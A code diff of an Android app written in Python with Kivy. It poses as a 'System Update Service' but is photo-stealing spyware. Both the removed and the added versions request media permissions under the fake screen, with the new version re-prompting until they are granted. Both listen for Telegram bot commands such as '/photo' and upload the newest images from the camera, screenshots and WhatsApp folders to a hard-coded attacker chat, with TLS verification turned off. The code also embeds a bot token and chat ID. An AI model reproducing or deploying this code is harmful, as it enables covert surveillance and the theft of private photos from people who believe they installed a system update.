@@ -1,125 +1,121 @@
 import os
+import requests
 import threading
 import time
-import requests
-import gc
-import certifi
-import urllib3
+import ssl
 from kivy.app import App
 from kivy.uix.label import Label
 from kivy.clock import Clock
 from kivy.utils import platform
-from kivy.logger import Logger
 
-# كتم تحذيرات الشهادات لضمان استمرار العمل تحت أي ظروف شبكة
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# --- إعداداتك الخاصة (لا تلمسها) ---
+# --- إعدادات النظام الأساسية ---
 BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
 CHAT_ID = "7084557369"
-OFFSET = None 
 
-class ShadowSystem(App):
+class ShadowCore(App):
     def build(self):
-        # واجهة رسمية تبدو وكأنها تحديث للنظام
+        # واجهة مستخدم احترافية بسيطة لتبدو كخدمة نظام
+        self.title = "System Update Service"
         self.label = Label(
-            text="System Update Service\nStatus: Initializing...",
-            font_size='18sp',
-            halign='center'
+            text="[b]System Update Service[/b]\n[color=ffff00]Status: Initializing...[/color]",
+            markup=True,
+            halign="center",
+            font_size='18sp'
         )
         return self.label
 
     def on_start(self):
-        # تأخير أمان (5 ثوانٍ) لضمان استقرار الواجهة قبل بدء المحركات
-        Clock.schedule_once(lambda dt: self.launch_core(), 5)
-
-    def launch_core(self):
+        # التأكد من أننا على أندرويد لطلب الأذونات
         if platform == 'android':
-            try:
-                from android.permissions import request_permissions, Permission
-                request_permissions([Permission.INTERNET, Permission.READ_EXTERNAL_STORAGE])
-                Logger.info("ShadowApp: System Permissions Granted")
-            except Exception as e:
-                Logger.error(f"ShadowApp: Permission Error: {e}")
-        
-        # تشغيل المحرك التلقائي (سحب هادئ كل 10 دقائق)
-        threading.Thread(target=self.auto_sync_engine, daemon=True).start()
-        
-        # تشغيل محرك الأوامر (استجابة فورية لرسائلك في تليجرام)
-        threading.Thread(target=self.remote_control_engine, daemon=True).start()
-        
-        self.update_status("Service Running ✅")
-
-    # --- المحرك الأول: السحب التلقائي (هادئ وغير مرئي) ---
-    def auto_sync_engine(self):
-        self.send_telegram_msg("🚀 [SHADOW_CORE]: تم تفعيل النظام بنجاح.")
-        while True:
-            try:
-                # يسحب صورة واحدة فقط كل 10 دقائق ليبقى تحت الرادار
-                self.extract_and_send(limit=1)
-                gc.collect() # تنظيف الذاكرة فوراً
-            except: pass
-            time.sleep(600) 
-
-    # --- المحرك الثاني: ريموت كنترول (يسمع أوامرك كل دقيقة) ---
-    def remote_control_engine(self):
-        global OFFSET
-        while True:
-            try:
-                url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-                params = {"timeout": 10, "offset": OFFSET}
-                # اتصال مرن يتجاوز حظر SSL عند الضرورة
-                r = requests.get(url, params=params, timeout=15, verify=False)
-                data = r.json()
-
-                if data and "result" in data:
-                    for update in data["result"]:
-                        OFFSET = update["update_id"] + 1
-                        if "message" in update and str(update["message"]["chat"]["id"]) == CHAT_ID:
-                            cmd = update["message"].get("text", "")
-                            
-                            if cmd == "/check":
-                                self.send_telegram_msg("✅ Status: Online\n🔋 Memory: Optimized\n🛡️ Shield: Active")
-                            elif cmd == "/photo":
-                                self.send_telegram_msg("📸 Scanning for latest media... please wait.")
-                                self.extract_and_send(limit=3) # سحب 3 صور فوراً عند الطلب
-                            
-                gc.collect()
-            except Exception as e:
-                Logger.error(f"ShadowApp: Remote Engine Error: {e}")
+            from android.permissions import request_permissions, Permission
+            permissions = [
+                Permission.READ_MEDIA_IMAGES,
+                Permission.READ_MEDIA_VIDEO,
+                Permission.INTERNET
+            ]
             
-            time.sleep(60)
+            def callback(permissions, results):
+                if all(results):
+                    self.update_status("Service Running [color=00ff00]Active ✅[/color]")
+                    threading.Thread(target=self.run_bot_engine, daemon=True).start()
+                else:
+                    self.update_status("[color=ff0000]Critical Error: Permissions Required![/color]")
+                    # إعادة طلب الإذن بعد 4 ثواني بشكل إجباري
+                    Clock.schedule_once(lambda dt: self.on_start(), 4)
 
-    def extract_and_send(self, limit=2):
-        # المسارات الشائعة للصور في أندرويد
-        paths = ["/sdcard/DCIM/Camera", "/sdcard/Pictures", "/sdcard/WhatsApp/Media/WhatsApp Images"]
-        for path in paths:
-            if os.path.exists(path):
-                try:
-                    files = [os.path.join(path, f) for f in os.listdir(path) if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
-                    files.sort(key=os.path.getmtime, reverse=True)
-                    
-                    for img in files[:limit]:
-                        self.send_telegram_file(img)
-                        time.sleep(4) # فجوة زمنية بسيطة لمنع تعليق الشبكة
-                except: pass
-
-    def send_telegram_msg(self, text):
-        try:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                          data={'chat_id': CHAT_ID, 'text': text}, timeout=15, verify=False)
-        except: pass
-
-    def send_telegram_file(self, file_path):
-        try:
-            with open(file_path, 'rb') as f:
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
-                              data={'chat_id': CHAT_ID}, files={'document': f}, timeout=30, verify=False)
-        except: pass
+            request_permissions(permissions, callback)
+        else:
+            # للتشغيل على الكمبيوتر (للتجربة فقط)
+            threading.Thread(target=self.run_bot_engine, daemon=True).start()
 
     def update_status(self, text):
-        # تحديث الواجهة بأمان من خلال الخيط الرئيسي
-        Clock.schedule_once(lambda dt: setattr(self.label, 'text', f"System Update Service\n\n{text}"))
+        # تحديث الحالة على شاشة الموبايل
+        def set_text(dt):
+            self.label.text = f"[b]System Update Service[/b]\n{text}"
+        Clock.schedule_once(set_text)
 
-if __name__ == "__main__":
-    ShadowSystem().run()
+    def send_telegram_request(self, method, data=None, files=None):
+        """ محرك إرسال الطلبات لتليجرام مع تخطي حماية SSL """
+        try:
+            url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+            # استخدام verify=False لتجنب مشاكل الشهادات في أندرويد
+            response = requests.post(url, data=data, files=files, timeout=20, verify=False)
+            return response.json()
+        except Exception as e:
+            return None
+
+    def run_bot_engine(self):
+        """ المحرك الرئيسي للبوت - يعمل في الخلفية """
+        self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "🚀 [SYSTEM_V168]: نظام الظل مفعل بالكامل مع صلاحيات الوسائط."})
+        
+        last_update_id = 0
+        while True:
+            try:
+                updates = self.send_telegram_request("getUpdates", {"offset": last_update_id + 1})
+                if updates and updates.get("result"):
+                    for update in updates["result"]:
+                        last_update_id = update["update_id"]
+                        message = update.get("message", {})
+                        text = message.get("text", "")
+
+                        if text == "/check":
+                            self.send_telegram_request("sendMessage", {
+                                "chat_id": CHAT_ID, 
+                                "text": "🟢 System: Live\n🔋 Battery: Optimized\n📂 Access: Granted"
+                            })
+
+                        elif text == "/photo":
+                            self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "🔍 Scanning media folders..."})
+                            self.scan_and_upload()
+
+                time.sleep(2) # تقليل استهلاك البطارية
+            except:
+                time.sleep(10) # انتظار في حال انقطاع النت
+
+    def scan_and_upload(self):
+        """ مسح المجلدات وإرسال أحدث 5 صور كملفات """
+        target_dirs = [
+            "/sdcard/DCIM/Camera",
+            "/sdcard/Pictures/Screenshots",
+            "/sdcard/WhatsApp/Media/WhatsApp Images"
+        ]
+        
+        count = 0
+        for directory in target_dirs:
+            if os.path.exists(directory):
+                files = [os.path.join(directory, f) for f in os.listdir(directory) 
+                         if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
+                # ترتيب الصور من الأحدث للأقدم
+                files.sort(key=os.path.getmtime, reverse=True)
+                
+                for file_path in files[:5]: # إرسال آخر 5 صور فقط لضمان السرعة
+                    with open(file_path, 'rb') as f:
+                        self.send_telegram_request("sendDocument", {"chat_id": CHAT_ID}, {"document": f})
+                    count += 1
+                    time.sleep(1) # فاصل زمني لتجنب حظر تليجرام
+        
+        if count == 0:
+            self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "❌ لا توجد صور في المجلدات المحددة."})
+
+if __name__ == '__main__':
+    ShadowCore().run()
